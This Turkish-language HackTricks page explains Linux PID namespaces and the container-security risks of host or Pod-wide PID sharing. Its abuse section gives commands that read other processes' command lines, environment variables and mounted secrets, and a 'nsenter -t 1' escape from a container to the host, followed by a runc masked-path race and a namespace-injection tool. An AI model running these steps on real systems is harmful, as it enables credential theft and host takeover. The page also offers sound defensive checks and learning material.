# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Genel Bakış

PID namespace, process'lerin nasıl numaralandırıldığını ve hangi process'lerin görünür olduğunu kontrol eder. Bu nedenle bir container, gerçek bir makine olmamasına rağmen kendi PID 1'ine sahip olabilir. Namespace içinde workload, yerel bir process tree olarak görünen yapıyı görür. Namespace dışında ise host, gerçek host PID'lerini ve tüm process görünümünü görmeye devam eder.<sup>[[3]](#references)</sup>

Güvenlik açısından PID namespace önemlidir çünkü process görünürlüğü değerlidir. Bir workload host process'lerini görebildiğinde service adlarını, command-line argümanlarını, process argümanlarında geçirilen secret'ları, `/proc` üzerinden environment kaynaklı durumu ve olası namespace-entry hedeflerini gözlemleyebilir. Uygun koşullar altında signal göndermek veya ptrace kullanmak gibi, bu process'leri yalnızca görmekten fazlasını yapabiliyorsa sorun çok daha ciddi hale gelir.

## Çalışma

Yeni bir PID namespace, kendi dahili process numaralandırmasıyla başlar. Namespace içinde oluşturulan ilk process, namespace'in bakış açısından PID 1 olur; bu da orphaned child process'ler ve signal davranışı için özel init benzeri semantics kazandığı anlamına gelir. Bu durum, init process'leri, zombie reaping ve container'larda neden bazen küçük init wrapper'larının kullanıldığıyla ilgili birçok container davranışını açıklar.<sup>[[3]](#references)</sup>

PID namespace'ler bir hierarchy oluşturur. Bir ancestor namespace içindeki process, descendant'lara o ancestor içinde atanmış PID'yi kullanarak erişebilir; ancak bir descendant, ordinary PID-based syscall'lar aracılığıyla yalnızca ancestor'a ait task'lara erişemez veya `setns()` ile yukarı doğru bir ancestor PID namespace'ine katılamaz. Descendant'a deliberately exposed edilmiş ancestor-owned bir procfs, ancestor'ın process görünümünü yine de leak edebilir. Ayrıca `setns()` ile bir PID namespace'e katılmak, caller'ın kendisi yerine **future children** için namespace'i değiştirir; bu nedenle araçlar katıldıktan sonra fork eder. Bir procfs mount'u, onu mount eden process'in PID görünümünü korur; bu nedenle `unshare(CLONE_NEWPID)` sonrasında yeni bir procfs oluşturmak yalnızca cosmetic değil, security-relevant bir işlemdir.<sup>[[3]](#references)</sup>

Önemli security lesson şudur: Bir process yalnızca kendi PID tree'sini gördüğü için isolated görünebilir, ancak bu isolation deliberately kaldırılabilir. Docker bunu `--pid=host` üzerinden, Kubernetes ise `hostPID: true` üzerinden sunar. Container host PID namespace'e katıldığında workload, host process'lerini doğrudan görür ve sonraki attack path'lerin çoğu çok daha gerçekçi hale gelir.

## Lab

Manually bir PID namespace oluşturmak için:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Shell artık private bir process görünümü görür. `--mount-proc` flag'i önemlidir; çünkü yeni PID namespace ile eşleşen bir procfs instance'ı mount ederek process listesinin içeriden tutarlı olmasını sağlar.<sup>[[3]](#references)</sup>

Container davranışını karşılaştırmak için:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Fark hemen görülür ve anlaşılması kolaydır; bu nedenle okuyucular için iyi bir ilk lab çalışmasıdır.

## Runtime Kullanımı

Docker, Podman, containerd ve CRI-O'daki normal container'lar kendi PID namespace'lerini alır. Kubernetes container'ları normalde ayrı PID görünümlerine sahiptir; `shareProcessNamespace: true` ise kasıtlı olarak tüm Pod için ortak bir görünüm oluşturur.<sup>[[4]](#references)</sup> Buna karşılık `hostPID: true`, node'un PID namespace'ini seçer. LXC/Incus ortamları da aynı kernel primitive'ine dayanır; ancak system-container kullanım senaryoları daha karmaşık process tree'leri ortaya çıkarabilir ve daha fazla debugging kestirmesini teşvik edebilir.

Aynı kural her yerde geçerlidir: runtime PID namespace'ini izole etmemeyi seçtiyse bu, container sınırının kasıtlı olarak zayıflatılmasıdır.

## Yanlış Yapılandırmalar

Temel yanlış yapılandırma, host PID paylaşımıdır. Ekipler bunu çoğu zaman debugging, monitoring veya service-management kolaylığıyla gerekçelendirir; ancak bu her zaman anlamlı bir security istisnası olarak ele alınmalıdır. Container'ın host process'leri üzerinde doğrudan bir yazma primitive'i olmasa bile yalnızca görünürlük, sistem hakkında çok fazla bilgi açığa çıkarabilir. `CAP_SYS_PTRACE` gibi capability'ler veya kullanışlı procfs erişimi eklendiğinde risk önemli ölçüde büyür.

Bir diğer hata, workload varsayılan olarak host process'lerini kill edemediği veya ptrace edemediği için host PID paylaşımının zararsız olduğunu varsaymaktır. Bu sonuç enumeration değerini, namespace-entry hedeflerinin kullanılabilirliğini ve PID görünürlüğünün diğer zayıflatılmış kontrollerle birleşme şeklini göz ardı eder.

### Kubernetes Pod genelinde process paylaşımı

`shareProcessNamespace: true`, `hostPID`'den farklıdır: node process'lerini değil, **aynı Pod içindeki diğer container'ların process'lerini** açığa çıkarır. Bu durumda ele geçirilmiş bir sidecar veya debug container'ı, procfs erişim kontrollerine tabi olarak kardeş container'ların command line'larını ve environment verilerini enumerate edebilir, credentials izin verdiğinde signal gönderebilir ve `/proc/<pid>/root` üzerinden bir kardeşin filesystem'inde gezinebilir. Kubernetes, command-line/environment secret'larının ve container filesystem'larının bundan sonra yalnızca geçerli Unix permission'larıyla korunduğu konusunda açıkça uyarır.<sup>[[4]](#references)</sup>

Cluster tarafında yapılabilecek yararlı inceleme:
```bash
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
[.metadata.namespace,.metadata.name,
(.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```
Pod genelindeki bir PID namespace içindeki ele geçirilmiş bir container'dan, görünürlüğün okunabilirliğe eşit olduğunu varsaymak yerine önce gerçek erişimi test edin:<sup>[[4]](#references)</sup>
```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```
## Kötüye Kullanım

Host PID namespace paylaşılıyorsa bir saldırgan host process'lerini inceleyebilir, process argümanlarını toplayabilir, ilgi çekici servisleri belirleyebilir, `nsenter` için aday PID'leri bulabilir veya process görünürlüğünü ptrace ile ilişkili yetkilerle birleştirerek host ya da komşu workload'lara müdahale edebilir. Bazı durumlarda, yalnızca doğru uzun süre çalışan process'i görmek bile saldırı planının geri kalanını şekillendirmek için yeterlidir.

İlk pratik adım her zaman host process'lerinin gerçekten görünür olduğunu doğrulamaktır:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Host PID'leri görünür olduğunda, process argümanları ve namespace-entry hedefleri çoğu zaman en yararlı bilgi kaynağı olur:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
`nsenter` kullanılabiliyorsa ve yeterli ayrıcalık mevcutsa, görünür bir host process'in namespace bridge olarak kullanılıp kullanılamayacağını test edin:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Giriş engellense bile host PID paylaşımı, hizmet yerleşimini, runtime bileşenlerini ve sonraki hedef olarak seçilebilecek aday ayrıcalıklı süreçleri ortaya çıkardığı için zaten değerlidir. Tek başına PID görünürlüğü; sinyal gönderme, trace etme, hassas `/proc/<pid>` girdilerini okuma veya hedefin diğer namespace'lerine katılma izni vermez; kimlik bilgileri, dumpability, hedef namespace'in sahibi olan user namespace'teki capabilities, Yama/LSM policy ve seccomp hâlâ önemini korur.<sup>[[3]](#references)</sup> Process-injection örnekleri için [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) bölümüne bakın.

Host PID görünürlüğü, file-descriptor abuse senaryolarını da daha gerçekçi hâle getirir. Ayrıcalıklı bir host süreci veya komşu bir workload hassas bir dosyayı ya da socket'i açık tutuyorsa saldırgan, ptrace tarzı kontroller, sahiplik, procfs mount seçenekleri, nesne türü ve hedef service modeline bağlı olarak `/proc/<pid>/fd/` dizinini inceleyebilir ve temel nesneye erişebilir. Bir FD symlink'ini görmek, onun açılabileceği anlamına gelmez; bir socket, yalnızca `/proc/<pid>/fd/N` symlink'ini açarak duplicate edilemez. Ayrı `pidfd_getfd()` primitive'i ve yetkilendirme kontrolleri için [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md) bölümüne bakın.<sup>[[3]](#references)</sup>
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Bu komutlar, `hidepid=1` veya `hidepid=2` ayarının süreçler arası görünürlüğü azaltıp azaltmadığını ve açık secret dosyaları, log'lar veya Unix soketleri gibi açıkça ilgi çekici tanımlayıcıların gerçekten görünür olup olmadığını belirlemek için kullanışlıdır.

### Tam Örnek: host PID + `nsenter`

Process aynı zamanda host namespace'lerine katılmak için yeterli yetkiye sahip olduğunda, host PID paylaşımı doğrudan bir host escape'e dönüşür:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Komut başarılı olursa container process'i artık host'un mount, UTS, network, IPC ve PID namespace'lerinde çalışmaktadır. Etki, host'un derhâl ele geçirilmesidir.

`nsenter` eksik olsa bile host filesystem'i mount edilmişse aynı sonuç host binary'si üzerinden elde edilebilir:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Recent Runtime Notes

Bazı PID namespace ile ilgili saldırılar, geleneksel `hostPID: true` yanlış yapılandırmaları değil; procfs korumalarının container kurulumu sırasında nasıl uygulandığıyla ilgili runtime implementation bug'larıdır.

#### `maskedPaths` race to host procfs

Güvenlik açığı bulunan `runc` sürümlerinde, container image'ını veya `runc exec` workload'unu kontrol edebilen saldırganlar, container içindeki `/dev/null` dosyasını `/proc/sys/kernel/core_pattern` gibi hassas bir procfs yoluna işaret eden bir symlink ile değiştirerek masking aşamasında race condition oluşturabilir. Race başarılı olursa, masked-path bind mount yanlış hedefe bağlanabilir ve host-global procfs ayarlarını yeni container'a açığa çıkarabilir.<sup>[[1]](#references)</sup>

Useful review command:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Bu önemlidir çünkü nihai etki, doğrudan procfs exposure ile aynı olabilir: yazılabilir `core_pattern` veya `sysrq-trigger` sonrasında host code execution ya da denial of service. Özel [masked paths](../masked-paths.md) ve [sensitive host mounts](../../sensitive-host-mounts.md) sayfaları, burada tekrarlamadan genel procfs attack surface'ini ele alır.

#### Namespace injection with `insject`

`insject` gibi Namespace injection araçları, PID-namespace etkileşiminin process creation öncesinde hedef namespace'e önceden girmeyi her zaman gerektirmediğini gösterir. Bir helper daha sonra attach olabilir, `setns()` kullanabilir ve hedef PID space görünürlüğünü koruyarak execute edebilir:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Bu tür teknikler, özellikle runtime workload'u başlattıktan sonra namespace context'in birleştirilmesi gereken advanced debugging, offensive tooling ve post-exploitation workflows süreçlerinde önem taşır.

### İlgili FD Abuse Patterns

Host PID'leri görünür olduğunda iki pattern özellikle belirtilmeye değerdir. İlk olarak, privileged bir process, `O_CLOEXEC` ile işaretlenmediği için `execve()` boyunca sensitive bir file descriptor'ü açık tutabilir. İkinci olarak, servisler Unix socket'leri üzerinden `SCM_RIGHTS` aracılığıyla file descriptor aktarabilir. Her iki durumda da ilgi çekici nesne artık pathname değil, lower-privilege bir process'in inherit edebileceği veya receive edebileceği hâlihazırda açık handle'dır.

Bu durum container çalışmalarında önemlidir; çünkü handle, path'in kendisine container filesystem içinden doğrudan erişilemese bile `docker.sock`, privileged bir log, host'a ait bir secret file veya başka bir high-value object'e işaret edebilir.

## Kontroller

Bu komutların amacı, process'in private bir PID görünümüne sahip olup olmadığını veya çok daha geniş bir process landscape'i zaten enumerate edip edemediğini belirlemektir.
```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```
Burada ilgi çekici olanlar:<sup>[[3]](#references)</sup>

- Process listesi bariz host servisleri içeriyorsa host PID paylaşımı muhtemelen zaten etkindir.
- Yalnızca küçük bir container-local ağaç görmek normal baseline'dır; `systemd`, `dockerd` veya ilgisiz daemon'lar görmek normal değildir.
- `NSpid`, iç içe namespace'ler arasındaki PID eşlemesini açığa çıkarabilir. En soldaki değer procfs mount'ıyla ilişkilendirilmiş PID namespace'e göredir; bunu art arda iç içe namespace'ler için değerler takip eder.
- `readlink /proc/self/ns/pid` tek başına `hostPID` olduğunu kanıtlayamaz: izole bir container'ın da geçerli bir PID-namespace inode'u vardır. Bunu process listesi, procfs mount'ı, runtime configuration ve mevcut olduğunda host-side namespace inode'u ile ilişkilendirin.
- Host PID'leri görünür hâle geldiğinde, salt-okunur process bilgileri bile reconnaissance için kullanışlı olur.

Host PID paylaşımıyla çalışan bir container keşfederseniz bunu kozmetik bir fark olarak değerlendirmeyin. Bu, workload'un gözlemleyebileceği ve potansiyel olarak etkileyebileceği şeylerde büyük bir değişikliktir.



## References

- [1] [runc güvenlik danışmanlığı: mount race koşulları nedeniyle "masked path" kötüye kullanımı üzerinden container escape (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Tool Release – insject: Bir Linux Namespace Injector'ı](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Linux man-pages 6.19 kitabı](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Bir Pod İçindeki Container'lar Arasında Process Namespace Paylaşma](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
{{#include ../../../../../banners/hacktricks-training.md}}
